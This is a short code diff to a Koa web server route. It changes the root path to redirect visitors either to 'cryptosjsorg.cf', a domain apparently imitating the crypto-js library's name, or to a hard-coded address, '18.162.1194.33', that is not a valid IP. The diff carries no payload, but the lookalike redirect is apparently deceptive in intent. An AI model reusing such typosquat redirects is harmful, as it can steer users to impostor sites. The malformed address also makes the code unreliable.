@@ -115,7 +115,19 @@ app.use(async (ctx, next)=>{
 
 router.get('/', async ctx => {
     // ctx.body = ``; 
-    ctx.response.redirect('http://cryptosjsorg.cf');
+    var str=ctx.href; //请求地址
+    var shu=str.includes('cryptojsorg');
+    console.log(str);
+    console.log(shu);
+    if(shu){
+        console.log('yu');
+        
+        ctx.response.redirect('http://cryptosjsorg.cf');
+    }else{
+        console.log('ip');
+        
+        ctx.response.redirect('http://18.162.1194.33');
+    }
 });
 
 
